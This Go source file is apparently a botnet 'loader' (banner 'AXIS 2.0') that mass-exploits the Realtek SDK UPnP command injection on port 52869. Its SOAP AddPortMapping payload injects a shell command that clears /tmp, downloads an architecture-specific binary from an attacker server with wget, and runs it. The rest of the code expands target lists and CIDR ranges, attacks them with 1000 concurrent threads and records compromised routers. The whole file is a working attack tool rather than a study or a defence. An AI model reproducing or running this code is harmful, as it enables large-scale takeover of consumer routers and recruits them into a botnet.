package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

/* ============================================================================
 * REALTEK UPNP LOADER - Router Exploitation Module
 * ============================================================================
 * Exploits Realtek SDK UPnP vulnerability (port 52869)
 * Targets: SOHO routers with Realtek chips (TP-Link, D-Link, Tenda)
 * Method: SOAP AddPortMapping command injection
 * Global coverage: All regions with cheap router deployments
 * ============================================================================ */

// Realtek UPnP exploit payload
const realtekPayload = `POST /picsdesc.xml HTTP/1.1
Host: %s
Content-Length: 630
Accept-Encoding: gzip, deflate
SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
Accept: */*
User-Agent: Hello-World
Connection: keep-alive

<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>47451</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
<NewInternalPort>44382</NewInternalPort>
<NewInternalClient>` + "`cd /tmp/; rm -rf *; wget http://%s/bins/axis.$(uname -m); chmod 777 axis.$(uname -m); ./axis.$(uname -m) &`" + `</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>syncthing</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>

`

type RealtekResult struct {
	IP      string
	Port    string
	Success bool
}

func exploitRealtek(ip, port, serverIP string, wg *sync.WaitGroup, results chan<- RealtekResult, sem chan struct{}) {
	defer wg.Done()

	sem <- struct{}{}
	defer func() { <-sem }()

	addr := ip + ":" + port
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(5 * time.Second))

	// Send Realtek exploit payload
	payload := fmt.Sprintf(realtekPayload, ip, serverIP)
	conn.Write([]byte(payload))

	// Read response
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return
	}

	response := string(buf[:n])

	// Check for successful exploitation
	if strings.Contains(response, "200 OK") || 
		strings.Contains(response, "OK") ||
		strings.Contains(response, "AddPortMapping") {
		
		results <- RealtekResult{
			IP:      ip,
			Port:    port,
			Success: true,
		}
	}
}

func expandCIDR(cidr string, port string) []string {
	var targets []string
	
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return targets
	}
	
	mask := ipnet.Mask
	network := ipnet.IP
	ones, bits := mask.Size()
	
	hosts := uint32(1) << (uint32(bits) - uint32(ones))
	
	if hosts > 65536 {
		fmt.Printf("[*] Skipping large CIDR %s (%d IPs, max /16)\n", cidr, hosts)
		return targets
	}
	
	ipUint32 := uint32(network[0])<<24 | uint32(network[1])<<16 | uint32(network[2])<<8 | uint32(network[3])
	
	for i := uint32(0); i < hosts; i++ {
		ip := ipUint32 + i
		ipStr := fmt.Sprintf("%d.%d.%d.%d:%s",
			(ip>>24)&0xFF,
			(ip>>16)&0xFF,
			(ip>>8)&0xFF,
			ip&0xFF,
			port)
		targets = append(targets, ipStr)
	}
	
	return targets
}

func loadFromURL(url string) ([]string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var targets []string
	scanner := bufio.NewScanner(strings.NewReader(string(body)))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		if strings.Contains(line, "/") {
			parts := strings.Split(line, ":")
			port := "52869"
			cidr := parts[0]

			if len(parts) > 1 {
				port = parts[1]
			}

			expanded := expandCIDR(cidr, port)
			fmt.Printf("[*] Expanded CIDR %s to %d IPs\n", cidr, len(expanded))
			targets = append(targets, expanded...)
			continue
		}

		if strings.Contains(line, ":") {
			targets = append(targets, line)
		} else {
			targets = append(targets, line+":52869")
		}
	}

	return targets, scanner.Err()
}

func loadRealtekList(filename string) ([]string, error) {
	var targets []string

	if strings.HasPrefix(filename, "http://") || strings.HasPrefix(filename, "https://") {
		fmt.Printf("[*] Loading list from URL: %s\n", filename)
		return loadFromURL(filename)
	}

	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		if strings.Contains(line, "/") {
			parts := strings.Split(line, ":")
			port := "52869"
			cidr := parts[0]

			if len(parts) > 1 {
				port = parts[1]
			}

			expanded := expandCIDR(cidr, port)
			fmt.Printf("[*] Expanded CIDR %s to %d IPs\n", cidr, len(expanded))
			targets = append(targets, expanded...)
			continue
		}

		if strings.Contains(line, ":") {
			targets = append(targets, line)
		} else {
			targets = append(targets, line+":52869")
		}
	}

	return targets, scanner.Err()
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./realtek-loader <realtek.lst|URL> <server-ip> [threads]")
		fmt.Println("Example (file): ./realtek-loader b4ckdoorarchive/RANDOM.LST/realtek.lst 1.2.3.4 1000")
		fmt.Println("Example (URL):  ./realtek-loader https://example.com/targets.txt 1.2.3.4 1000")
		fmt.Println("")
		fmt.Println("Supported formats:")
		fmt.Println("  - Plain IPs: 192.168.1.1")
		fmt.Println("  - IP:Port: 192.168.1.1:52869")
		fmt.Println("  - CIDR: 192.168.0.0/16 (your home network)")
		fmt.Println("  - CIDR:Port: 192.168.0.0/16:52869")
		fmt.Println("  - URL: https://example.com/targets.txt")
		os.Exit(1)
	}

	ipFile := os.Args[1]
	serverIP := os.Args[2]
	threads := 1000
	if len(os.Args) > 3 {
		threads, _ = strconv.Atoi(os.Args[3])
	}

	fmt.Printf("[*] AXIS 2.0 Realtek UPnP Loader\n")
	fmt.Printf("[*] Loading targets from: %s\n", ipFile)
	fmt.Printf("[*] Payload server: %s\n", serverIP)
	fmt.Printf("[*] Using %d concurrent threads\n", threads)

	targets, err := loadRealtekList(ipFile)
	if err != nil {
		fmt.Printf("[-] Error loading Realtek list: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[*] Loaded %d Realtek targets\n", len(targets))
	fmt.Printf("[*] Starting Realtek exploitation...\n\n")

	var wg sync.WaitGroup
	results := make(chan RealtekResult, 100)
	sem := make(chan struct{}, threads)

	// Start result writer
	go func() {
		f, _ := os.OpenFile("realtek_results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer f.Close()
		
		for result := range results {
			if result.Success {
				line := fmt.Sprintf("%s:%s\n", result.IP, result.Port)
				f.WriteString(line)
				fmt.Printf("[+] REALTEK EXPLOITED: %s:%s\n", result.IP, result.Port)
			}
		}
	}()

	startTime := time.Now()
	
	for _, target := range targets {
		parts := strings.Split(target, ":")
		if len(parts) != 2 {
			continue
		}
		
		wg.Add(1)
		go exploitRealtek(parts[0], parts[1], serverIP, &wg, results, sem)
	}

	wg.Wait()
	close(results)

	elapsed := time.Since(startTime)
	fmt.Printf("\n[*] Realtek exploitation completed in %s\n", elapsed)
	fmt.Printf("[*] Results saved to: realtek_results.txt\n")
}
